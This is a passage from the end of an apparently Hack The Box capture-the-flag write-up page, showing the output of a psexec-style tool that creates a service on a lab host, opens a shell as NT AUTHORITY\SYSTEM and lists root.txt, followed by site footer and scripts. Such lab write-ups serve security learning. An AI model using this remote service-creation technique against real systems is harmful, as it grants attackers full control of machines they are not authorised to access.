+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Creating service xqpP on 10.10.11.42.....
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting service xqpP.....
+</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Press <span class=nb>help</span> <span class=k>for</span> extra shell commands
+</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 10.0.20348.2762<span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=o>(</span>c<span class=o>)</span> Microsoft Corporation. All rights reserved.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt; whoami
+</span></span><span class=line><span class=cl>nt authority<span class=se>\s</span>ystem
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt; <span class=nb>cd</span> C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt; dir
+</span></span><span class=line><span class=cl> Volume in drive C has no label.
+</span></span><span class=line><span class=cl> Volume Serial Number is 6131-DE70
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> Directory of C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>11/01/2024  02:47 PM    &lt;DIR&gt;          .
+</span></span><span class=line><span class=cl>10/22/2024  11:46 AM    &lt;DIR&gt;          ..
+</span></span><span class=line><span class=cl>03/28/2025  10:01 AM                <span class=m>34</span> root.txt
+</span></span><span class=line><span class=cl>               <span class=m>1</span> File<span class=o>(</span>s<span class=o>)</span>             <span class=m>34</span> bytes
+</span></span><span class=line><span class=cl>               <span class=m>2</span> Dir<span class=o>(</span>s<span class=o>)</span>   8,439,169,024 bytes free
+</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/markdown/>Markdown</a>
+<a href=/tags/css/>Css</a>
+<a href=/tags/html/>Html</a>
+<a href=/tags/themes/>Themes</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/puppy-htb-writeup/><div class=article-image><img src=/p/puppy-htb-writeup/Puppy.1a569071abf60f67eeef10547fa9591c_hu_d122df57b0412aac.png width=250 height=150 loading=lazy alt="Featured image of post Puppy HTB Writeup" data-hash="md5-GlaQcav2D2fu7xBUf6lZHA=="></div><div class=article-details><h2 class=article-title>Puppy HTB Writeup</h2></div></a></article><article class=has-image><a href=/p/vintage-htb-writeup/><div class=article-image><img src=/p/vintage-htb-writeup/Vintage.c76c8d36bbb5c07a9341e411232aaff4_hu_afa76026b5f92995.png width=250 height=150 loading=lazy alt="Featured image of post Vintage HTB Writeup" data-hash="md5-x2yNNru1wHqTQeQRIyqv9A=="></div><div class=article-details><h2 class=article-title>Vintage HTB Writeup</h2></div></a></article><article class=has-image><a href=/p/certified-htb-writeup/><div class=article-image><img src=/p/certified-htb-writeup/Certified.0c8ab10b3e65480c87e59dfcae1865e4_hu_6fca3ec18ac781dd.png width=250 height=150 loading=lazy alt="Featured image of post Certified HTB Writeup" data-hash="md5-DIqxCz5lSAyH5Z38rhhl5A=="></div><div class=article-details><h2 class=article-title>Certified HTB Writeup</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2024 -
+2025 R4zi0</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
